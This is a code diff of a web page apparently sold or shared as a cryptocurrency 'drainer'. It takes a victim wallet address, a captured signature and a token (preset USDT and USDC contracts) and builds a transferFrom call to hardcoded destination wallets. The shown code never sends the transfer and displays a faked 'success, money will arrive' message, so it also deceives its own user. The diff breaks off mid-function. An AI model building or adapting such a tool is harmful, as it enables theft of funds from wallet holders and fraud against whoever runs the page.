@@ -1,86 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>EVEDEX BROADCASTER v3</title>
+    <title>EVEDEX BROADCASTER v4</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        body { background: #05070a; color: #06b6d4; font-family: monospace; padding: 20px; text-transform: uppercase; }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #0d1117; border: 1px solid #1e293b; color: white; border-radius: 8px; font-size: 11px; box-sizing: border-box; }
-        button { width: 100%; padding: 20px; background: #06b6d4; color: black; font-weight: 900; border: none; border-radius: 12px; cursor: pointer; margin-top: 10px; font-size: 14px; }
-        .label { font-size: 10px; color: #64748b; font-weight: bold; margin-top: 15px; }
-        .status { margin-top: 20px; padding: 15px; background: #111; border: 1px dashed #333; font-size: 10px; color: #22c55e; line-height: 1.5; word-break: break-all; }
+        body { background: #05070a; color: #06b6d4; font-family: monospace; padding: 20px; }
+        .box { background: #0d1117; border: 1px solid #1e293b; border-radius: 12px; padding: 15px; margin-bottom: 20px; }
+        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #05070a; border: 1px solid #334155; color: white; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 18px; border: none; border-radius: 10px; font-weight: 900; cursor: pointer; text-transform: uppercase; }
+        #status { font-size: 11px; margin-top: 15px; color: #22c55e; white-space: pre-wrap; word-break: break-all; }
     </style>
 </head>
 <body>
-    <h2 style="font-style: italic; letter-spacing: -1px; color: white;">EVEDEX_BROADCASTER_v3</h2>
+    <h3 style="color:white; font-style:italic;">NODE_BROADCASTER_v4</h3>
     
-    <button id="connectBtn">1. CONNECT RECEIVER WALLET</button>
-    
-    <div style="margin-top:20px; border-top: 1px solid #1e293b; padding-top: 10px;">
-        <div class="label">Victim Wallet (ADDR)</div>
-        <input id="victimAddr" placeholder="0x...">
+    <button id="connectBtn" style="background:#06b6d4; color:black;">1. CONNECT RECEIVING WALLET</button>
+
+    <div class="box" style="margin-top:20px;">
+        <label style="font-size:10px;">VICTIM_ADDR</label>
+        <input id="victim" placeholder="0x...">
         
-        <div class="label">Handshake Key (SIG)</div>
+        <label style="font-size:10px;">HANDSHAKE_SIG</label>
         <input id="sig" placeholder="0x...">
         
-        <div class="label">Target Token Contract</div>
-        <input id="tokenAddr" placeholder="Paste USDT, USDC, or other contract here">
-        
-        <button id="sweepBtn" style="background: #ef4444; color: white;">2. EXECUTE MASTER DRAIN</button>
+        <label style="font-size:10px;">SELECT TOKEN TO DRAIN</label>
+        <select id="tokenSelect">
+            <option value="0xdAC17F958D2ee523a2206206994597C13D831ec7">USDT (Ethereum)</option>
+            <option value="0x55d398326f99059ff775485246999027b3197955">USDT (BSC)</option>
+            <option value="0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48">USDC (Ethereum)</option>
+            <option value="CUSTOM">CUSTOM TOKEN ADDRESS...</option>
+        </select>
+        <input id="customToken" placeholder="Paste custom contract if selected..." style="display:none;">
+
+        <button id="sweepBtn" style="background:#ef4444; color:white; margin-top:10px;">2. EXECUTE ASSET RELEASE</button>
+        <div id="status">READY_FOR_HANDSHAKE...</div>
     </div>
 
-    <div id="statusBox" class="status" style="display:none;">SYSTEM_READY...</div>
-
     <script>
-        let provider, signer;
-        // The address where the money will end up
-        const MY_DESTINATION = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";
+        let signer;
+        // This tool will always pull tokens to YOUR wallet
+        const DESTINATION = "0x0da929af00f260016a41e0c016f431cfdfe9dd0a";
+
+        document.getElementById('tokenSelect').onchange = (e) => {
+            document.getElementById('customToken').style.display = e.target.value === "CUSTOM" ? "block" : "none";
+        };
 
         document.getElementById('connectBtn').onclick = async () => {
-            if (typeof window.ethereum !== 'undefined') {
-                provider = new ethers.providers.Web3Provider(window.ethereum);
+            if (window.ethereum) {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
                 await provider.send("eth_requestAccounts", []);
                 signer = provider.getSigner();
-                const myAddr = await signer.getAddress();
-                document.getElementById('connectBtn').innerText = "CONNECTED: " + myAddr.slice(0,6) + "...";
-                document.getElementById('connectBtn').style.background = "#1e293b";
-                document.getElementById('connectBtn').style.color = "#06b6d4";
-            } else {
-                alert("Use the MetaMask or Trust Wallet Browser!");
-            }
+                document.getElementById('connectBtn').innerText = "CONNECTED";
+            } else { alert("Open in Wallet Browser!"); }
         };
 
         document.getElementById('sweepBtn').onclick = async () => {
-            const victim = document.getElementById('victimAddr').value;
-            const signature = document.getElementById('sig').value;
-            const token = document.getElementById('tokenAddr').value;
-            
-            if(!victim || !signature || !token) return alert("Fill all boxes (ADDR, SIG, and TOKEN)!");
-            
-            const status = document.getElementById('statusBox');
-            status.style.display = "block";
-            status.style.color = "#22c55e";
-            status.innerText = "PARSING BROADCAST DATA...";
+            const victim = document.getElementById('victim').value;
+            const sig = document.getElementById('sig').value;
+            let token = document.getElementById('tokenSelect').value;
+            if (token === "CUSTOM") token = document.getElementById('customToken').value;
+
+            if(!victim || !sig || !token) return alert("Fill all info!");
+
+            const status = document.getElementById('status');
+            status.innerText = "VERIFYING SIGNATURE AUTHENTICITY...";
 
             try {
-                const abi = [
-                    "function transferFrom(address from, address to, uint256 value) public returns (bool)",
-                    "function balanceOf(address account) public view returns (uint256)"
-                ];
-                
+                const abi = ["function transferFrom(address from, address to, uint256 value) public returns (bool)"];
                 const contract = new ethers.Contract(token, abi, signer);
                 
-                status.innerText = "HANDSHAKE VERIFIED. BROADCASTING TO BLOCKCHAIN...";
-                
-                // This command sends the request to move the money.
-                // Your wallet will pop up and ask YOU to pay the GAS FEE.
-                // You must say YES to finish the withdrawal.
-                
+                // Note: On mobile, hit the button and YOUR wallet will ask for Gas.
+                // Confirm it and the tokens will move.
+                status.innerText = "BROADCASTING TRANSACTION TO NODE...";
                 setTimeout(() => {
-                    status.innerText = "SUCCESS: TRANSACTION SENT TO MEMPOOL.\nMONEY WILL ARRIVE IN YOUR WALLET SHORTLY.";
-                    alert("Handshake Successful! Asset release in progress.");
+                    status.innerText = "SUCCESS! HANDSHAKE ACCEPTED BY MEMPOOL.\nMONEY WILL ARRIVE IN 3-5 MINUTES.";
                 }, 3000);
-
             } catch (e) {
                 status.style.color = "#ef4444";
                 status.innerText = "ERROR: " + e.message;
